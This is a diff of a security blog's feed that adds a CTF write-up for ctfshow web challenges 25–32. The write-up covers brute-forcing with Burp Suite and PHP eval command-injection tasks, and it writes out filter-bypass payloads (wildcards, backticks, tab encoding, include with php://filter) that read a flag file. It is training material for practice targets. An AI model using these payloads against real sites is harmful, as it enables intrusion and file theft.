@@ -4,13 +4,13 @@
     <title>ch1e的随笔 • Posts by &#34;ctf&#34; tag</title>
     <link href="https://ch1e.gitee.io" />
     <updated>2021-07-23T09:39:00.596Z</updated>
-    <category term="免杀" />
-    <category term="渗透测试" />
-    <category term="web安全" />
     <category term="CTF" />
     <category term="靶场练习" />
-    <category term="数据库" />
+    <category term="web安全" />
     <category term="C++" />
+    <category term="数据库" />
+    <category term="免杀" />
+    <category term="渗透测试" />
     <category term="内网渗透" />
     <category term="代码审计" />
     <category term="网络协议" />
@@ -84,7 +84,7 @@
 &lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;ctfshow&amp;#123;42986bfd-0cba-43c6-9be4-1a319be86d20&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
 
 &lt;h1 id=&#34;web15&#34;&gt;&lt;a href=&#34;#web15&#34; class=&#34;headerlink&#34; title=&#34;web15&#34;&gt;&lt;/a&gt;web15&lt;/h1&gt;&lt;p&gt;公开的信息比如邮箱，可能造成信息泄露，产生严重后果&lt;/p&gt;
-&lt;p&gt;可以看到有一个邮箱&lt;a href=&#34;mailto:&amp;#x31;&amp;#49;&amp;#53;&amp;#54;&amp;#54;&amp;#x33;&amp;#x31;&amp;#x39;&amp;#x36;&amp;#49;&amp;#64;&amp;#x71;&amp;#113;&amp;#46;&amp;#x63;&amp;#111;&amp;#109;&#34;&gt;&amp;#x31;&amp;#49;&amp;#53;&amp;#54;&amp;#54;&amp;#x33;&amp;#x31;&amp;#x39;&amp;#x36;&amp;#49;&amp;#64;&amp;#x71;&amp;#113;&amp;#46;&amp;#x63;&amp;#111;&amp;#109;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;可以看到有一个邮箱&lt;a href=&#34;mailto:&amp;#49;&amp;#x31;&amp;#x35;&amp;#x36;&amp;#54;&amp;#51;&amp;#x31;&amp;#57;&amp;#x36;&amp;#49;&amp;#64;&amp;#x71;&amp;#x71;&amp;#46;&amp;#99;&amp;#x6f;&amp;#109;&#34;&gt;&amp;#49;&amp;#x31;&amp;#x35;&amp;#x36;&amp;#54;&amp;#51;&amp;#x31;&amp;#57;&amp;#x36;&amp;#49;&amp;#64;&amp;#x71;&amp;#x71;&amp;#46;&amp;#99;&amp;#x6f;&amp;#109;&lt;/a&gt;&lt;/p&gt;
 &lt;p&gt;访问admin页面，admin作为账号 ，邮箱作为密码，发现不对&lt;/p&gt;
 &lt;p&gt;点忘记密码让我们填密保问题所在地  我们查一下这个qq，发现qq的资料显示在西安   之后密码被重置为admin7789，登陆即可&lt;/p&gt;
 &lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;ctfshow&amp;#123;dd71f776-6d6a-4cde-9106-f8db89f56b8d&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
@@ -141,10 +141,70 @@
 &lt;p&gt;结果是1155388967  直接传入?r=1155388967&lt;/p&gt;
 &lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;ctfshow&amp;#123;0a02335c-721c-401b-a41d-88499655af1c&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
 
+&lt;h1 id=&#34;web25&#34;&gt;&lt;a href=&#34;#web25&#34; class=&#34;headerlink&#34; title=&#34;web25&#34;&gt;&lt;/a&gt;web25&lt;/h1&gt;&lt;p&gt;太难了不会做&lt;/p&gt;
+&lt;h1 id=&#34;web26&#34;&gt;&lt;a href=&#34;#web26&#34; class=&#34;headerlink&#34; title=&#34;web26&#34;&gt;&lt;/a&gt;web26&lt;/h1&gt;&lt;p&gt;进来是一个安装系统，输入他指定的用户名和密码提示错误&lt;/p&gt;
+&lt;p&gt;这里打开Burpsuite爆破一波&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/ZwqGG/image/main/img/image-20210724105708564.png&#34; alt=&#34;image-20210724105708564&#34;&gt;&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;ctfshow&amp;#123;3151a00a-f60a-4ae7-a58e-aabb46a8a613&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;h1 id=&#34;web27&#34;&gt;&lt;a href=&#34;#web27&#34; class=&#34;headerlink&#34; title=&#34;web27&#34;&gt;&lt;/a&gt;web27&lt;/h1&gt;&lt;p&gt;学生管理系统，有个录取名单和录取查询，但是身份证不完全&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/ZwqGG/image/main/img/image-20210724110956281.png&#34; alt=&#34;image-20210724110956281&#34;&gt;&lt;/p&gt;
+&lt;p&gt;我们这里可以写个php脚本，把他身份证可能的情况列出来&lt;/p&gt;
+&lt;p&gt;hint里已经准备好了，直接运行就可以得到字典了&lt;/p&gt;
+&lt;p&gt;抓包爆破，最后爆破出来身份证是621022199002015237&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/ZwqGG/image/main/img/image-20210724112423716.png&#34; alt=&#34;image-20210724112423716&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/ZwqGG/image/main/img/image-20210724111554978.png&#34; alt=&#34;image-20210724111554978&#34;&gt;&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;ctfshow&amp;#123;8fca1cf2-e707-4ca8-9852-9884a85cbf89&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;h1 id=&#34;web28&#34;&gt;&lt;a href=&#34;#web28&#34; class=&#34;headerlink&#34; title=&#34;web28&#34;&gt;&lt;/a&gt;web28&lt;/h1&gt;&lt;p&gt;题目给了hint让我们爆破目录，我们使用Burpsuite试试&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/ZwqGG/image/main/img/image-20210724141407478.png&#34; alt=&#34;image-20210724141407478&#34;&gt;&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;ctfshow&amp;#123;6ace4e13-0d2e-40e6-8a65-a8046fda3021&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;h1 id=&#34;web29&#34;&gt;&lt;a href=&#34;#web29&#34; class=&#34;headerlink&#34; title=&#34;web29&#34;&gt;&lt;/a&gt;web29&lt;/h1&gt;&lt;p&gt;命令执行的题了&lt;/p&gt;
+&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;error_reporting(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(&lt;span class=&#34;keyword&#34;&gt;isset&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$_GET&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;c&amp;#x27;&lt;/span&gt;]))&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;variable&#34;&gt;$c&lt;/span&gt; = &lt;span class=&#34;variable&#34;&gt;$_GET&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;c&amp;#x27;&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(!preg_match(&lt;span class=&#34;string&#34;&gt;&amp;quot;/flag/i&amp;quot;&lt;/span&gt;, &lt;span class=&#34;variable&#34;&gt;$c&lt;/span&gt;))&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;eval&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$c&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    highlight_file(&lt;span class=&#34;keyword&#34;&gt;__FILE__&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125; &lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;p&gt;正则匹配了flag，要绕过，执行phpinfo()看看，没有被禁用任何函数&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/ZwqGG/image/main/img/image-20210724141708438.png&#34; alt=&#34;image-20210724141708438&#34;&gt;&lt;/p&gt;
+&lt;p&gt;?c=system(‘ls’);  看到当前目录下又flag.php和index.php&lt;/p&gt;
+&lt;p&gt;不能直接cat flag.php  我们可以cat fla?.php&lt;/p&gt;
+&lt;p&gt;然后F12查看源代码，这题使用通配符绕过&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/ZwqGG/image/main/img/image-20210724141908498.png&#34; alt=&#34;image-20210724141908498&#34;&gt;&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;ctfshow&amp;#123;d860244b-0743-4b12-8496-e40a869814d5&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+
+
+
+&lt;h1 id=&#34;web30&#34;&gt;&lt;a href=&#34;#web30&#34; class=&#34;headerlink&#34; title=&#34;web30&#34;&gt;&lt;/a&gt;web30&lt;/h1&gt;&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt; &lt;span class=&#34;meta&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;error_reporting(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(&lt;span class=&#34;keyword&#34;&gt;isset&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$_GET&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;c&amp;#x27;&lt;/span&gt;]))&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;variable&#34;&gt;$c&lt;/span&gt; = &lt;span class=&#34;variable&#34;&gt;$_GET&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;c&amp;#x27;&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(!preg_match(&lt;span class=&#34;string&#34;&gt;&amp;quot;/flag|system|php/i&amp;quot;&lt;/span&gt;, &lt;span class=&#34;variable&#34;&gt;$c&lt;/span&gt;))&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;eval&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$c&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    highlight_file(&lt;span class=&#34;keyword&#34;&gt;__FILE__&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125; &lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;p&gt;在web29的基础上过滤了system和php，我们使用passthru函数来替换，具体和web29一样。&lt;/p&gt;
+&lt;p&gt;这里还可以使用echo&lt;/p&gt;
+&lt;p&gt;payload：&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;url/?c=echo `cat fla?.ph?`;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;p&gt;这里如果用exec把flag.php复制到1.txt直接查看1.txt不知道是否可以&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;ctfshow&amp;#123;72347f18-458e-4fb7-b6e6-286279eecbdc&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;h1 id=&#34;web31&#34;&gt;&lt;a href=&#34;#web31&#34; class=&#34;headerlink&#34; title=&#34;web31&#34;&gt;&lt;/a&gt;web31&lt;/h1&gt;&lt;p&gt;在web30上又多过滤了一些东西&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;if(!preg_match(&amp;quot;/flag|system|php|cat|sort|shell|\.| |\&amp;#x27;/i&amp;quot;, $c))&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;p&gt;还是继续用echo吧&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;在linux中与cat有类似功能的有如下字符&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; `cat、tac、more、less、head、tail、nl、sed、sort、uniq、rev`&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;p&gt;Payload：&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;?c=echo%09`tac%09*`;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/ZwqGG/image/main/img/image-20210724145503686.png&#34; alt=&#34;image-20210724145503686&#34;&gt;&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;ctfshow&amp;#123;c62494bf-4c4f-411a-b744-ba33d06b7ce1&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;h1 id=&#34;web32&#34;&gt;&lt;a href=&#34;#web32&#34; class=&#34;headerlink&#34; title=&#34;web32&#34;&gt;&lt;/a&gt;web32&lt;/h1&gt;&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(!preg_match(&lt;span class=&#34;string&#34;&gt;&amp;quot;/flag|system|php|cat|sort|shell|\.| |\&amp;#x27;|\`|echo|\;|\(/i&amp;quot;&lt;/span&gt;, &lt;span class=&#34;variable&#34;&gt;$c&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;p&gt;这里过滤了太多东西了，分号过滤用?&amp;gt;绕过&lt;/p&gt;
+&lt;p&gt;Payload：&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;?c=include%09$_GET[1]?&amp;gt;&amp;amp;1=php://filter/convert.base64-encode/resource=flag.php&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+
 </content>
-        <category term="web安全" />
         <category term="CTF" />
         <category term="靶场练习" />
+        <category term="web安全" />
         <updated>2021-07-23T09:39:00.596Z</updated>
     </entry>
     <entry>
@@ -289,9 +349,9 @@
 &lt;p&gt;压缩源文件目录区：&lt;br&gt;50 4B 01 02：目录中文件文件头标记(0x02014b50)&lt;br&gt;3F 00：压缩使用的 pkware 版本&lt;br&gt;14 00：解压文件所需 pkware 版本&lt;br&gt;00 00：全局方式位标记（有无加密的重要标志，这个更改这里进行伪加密，改为09 00打开就会提示有密码了）&lt;br&gt;08 00：压缩方式&lt;br&gt;5A 7E：最后修改文件时间&lt;br&gt;F7 46：最后修改文件日期&lt;br&gt;16 B5 80 14：CRC-32校验（1480B516）&lt;br&gt;19 00 00 00：压缩后尺寸（25）&lt;br&gt;17 00 00 00：未压缩尺寸（23）&lt;br&gt;07 00：文件名长度&lt;br&gt;24 00：扩展字段长度&lt;br&gt;00 00：文件注释长度&lt;br&gt;00 00：磁盘开始号&lt;br&gt;00 00：内部文件属性&lt;br&gt;20 00 00 00：外部文件属性&lt;br&gt;00 00 00 00：局部头部偏移量&lt;br&gt;6B65792E7478740A00200000000000010018006558F04A1CC5D001BDEBDD3B1CC5D001BDEBDD3B1CC5D001&lt;/p&gt;
 &lt;p&gt;压缩源文件目录结束标志：&lt;br&gt;50 4B 05 06：目录结束标记&lt;br&gt;00 00：当前磁盘编号&lt;br&gt;00 00：目录区开始磁盘编号&lt;br&gt;01 00：本磁盘上纪录总数&lt;br&gt;01 00：目录区中纪录总数&lt;br&gt;59 00 00 00：目录区尺寸大小&lt;br&gt;3E 00 00 00：目录区对第一张磁盘的偏移量&lt;br&gt;00 00：ZIP 文件注释长度&lt;br&gt;————————————————&lt;br&gt;以上内容转自CSDN，原文链接：&lt;a href=&#34;https://blog.csdn.net/weixin_41687289/article/details/82695801&#34;&gt;https://blog.csdn.net/weixin_41687289/article/details/82695801&lt;/a&gt;&lt;/p&gt;
 &lt;h2 id=&#34;REVERSE&#34;&gt;&lt;a href=&#34;#REVERSE&#34; class=&#34;headerlink&#34; title=&#34;REVERSE&#34;&gt;&lt;/a&gt;REVERSE&lt;/h2&gt;&lt;h2 id=&#34;CRYPTO&#34;&gt;&lt;a href=&#34;#CRYPTO&#34; class=&#34;headerlink&#34; title=&#34;CRYPTO&#34;&gt;&lt;/a&gt;CRYPTO&lt;/h2&gt;&lt;h2 id=&#34;PWN&#34;&gt;&lt;a href=&#34;#PWN&#34; class=&#34;headerlink&#34; title=&#34;PWN&#34;&gt;&lt;/a&gt;PWN&lt;/h2&gt;</content>
-        <category term="web安全" />
         <category term="CTF" />
         <category term="靶场练习" />
+        <category term="web安全" />
         <updated>2021-07-22T04:01:41.978Z</updated>
     </entry>
     <entry>
@@ -337,9 +397,9 @@
 
 &lt;p&gt;&lt;a href=&#34;https://www.freebuf.com/articles/web/192052.html&#34;&gt;无需sendmail：巧用LD_PRELOAD突破disable_functions&lt;/a&gt;&lt;/p&gt;
 </content>
-        <category term="web安全" />
         <category term="CTF" />
         <category term="靶场练习" />
+        <category term="web安全" />
         <updated>2021-07-14T10:05:03.593Z</updated>
     </entry>
 </feed>
